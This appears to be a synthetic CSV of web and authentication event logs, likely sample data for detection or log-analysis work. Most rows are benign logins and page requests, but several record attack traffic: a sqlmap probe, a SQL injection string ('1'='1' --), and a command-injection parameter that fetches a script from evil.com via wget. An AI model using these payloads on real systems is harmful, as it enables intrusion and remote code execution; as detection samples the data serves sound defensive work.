event_id,timestamp,event_type,source_ip,user_agent,endpoint,http_method,query_params,username,auth_result,failure_reason,dest_port,protocol,connection_result,response_code,response_time_ms
5b08b8ee-2eeb-4368-a23c-6fa5ffb74c49,2024-12-01T00:05:49.080521Z,AUTH_ATTEMPT,10.0.0.54,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/login,POST,,robert.anderson,SUCCESS,,,,,200,88
f110d2f5-0d83-4a4b-80d4-e7d649aa5210,2024-12-01T00:09:49.196776Z,AUTH_ATTEMPT,10.0.0.50,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/login,POST,,james.jackson,SUCCESS,,,,,200,169
59b08451-fc56-4c5a-9f36-5396f46395d4,2024-12-01T00:10:13.020460Z,HTTP_REQUEST,192.168.1.101,sqlmap/1.7.2#stable (https://sqlmap.org),/api/database,POST,,,,,,,,403,40
2b330aa0-63d4-4927-bcbe-dbc36dc4ccea,2024-12-01T00:11:04.087198Z,HTTP_REQUEST,10.0.0.52,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/about,GET,,,,,,,,200,271
833610b4-0f4e-4c39-b9a0-a23002c4706a,2024-12-01T00:12:36.527971Z,HTTP_REQUEST,172.16.0.14,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/api/users,GET,,,,,,,,200,66
273a6a4a-4841-4163-ba0c-cfcd9877c7ae,2024-12-01T00:16:05.549790Z,AUTH_ATTEMPT,192.168.1.101,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/logout,POST,,chris.miller,LOGOUT,,,,,200,38
21dc3a8d-a794-4087-8c98-b7ad15c7d84f,2024-12-01T00:21:46.255202Z,HTTP_REQUEST,192.168.1.102,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/home,GET,,,,,,,,200,63
101f3f7a-ca5b-4eda-9abc-60b495560723,2024-12-01T00:24:18.315291Z,HTTP_REQUEST,10.0.0.50,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/api/reports,GET,,,,,,,,201,20
d61cf521-eabb-47ff-83df-a2c3d98ef391,2024-12-01T00:27:06.696168Z,HTTP_REQUEST,192.168.1.101,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/contact,GET,,,,,,,,200,198
74c8af9b-94e5-4599-9cd0-7457b1e2ad17,2024-12-01T00:29:56.443018Z,HTTP_REQUEST,192.168.1.102,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/logout,POST,,,,,,,,201,159
b96e580d-c81d-4e6c-b8a8-6fd466c4eacd,2024-12-01T00:31:07.865232Z,HTTP_REQUEST,162.247.74.27,Nmap Scripting Engine,/api/exec,GET,host=localhost$(wget -O- http://evil.com/c2.sh),,,,,,,500,821
ccff124f-c2bf-497a-977f-8d88c702459d,2024-12-01T00:33:40.925504Z,AUTH_ATTEMPT,192.168.1.102,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/login,POST,,nicole.clark,SUCCESS,,,,,200,181
83290c92-810d-480e-8362-d410c66695ce,2024-12-01T00:35:08.021126Z,HTTP_REQUEST,192.168.1.103,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/about,GET,,,,,,,,204,232
1bd1bd70-2d53-4d8e-9559-ba74f970cac3,2024-12-01T00:37:02.477212Z,HTTP_REQUEST,172.16.0.12,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/api/search,GET,,,,,,,,200,151
0ba6d037-bc09-46e2-a5f0-c89dd8353800,2024-12-01T00:38:51.369219Z,HTTP_REQUEST,103.75.201.4,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/api/search,POST,id=1' OR '1'='1' --,,,,,,,200,1825
f26d43cf-b55f-4496-be71-703ce6663ed8,2024-12-01T00:40:46.789340Z,AUTH_ATTEMPT,10.0.0.54,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/login,POST,,john.doe,SUCCESS,,,,,200,222
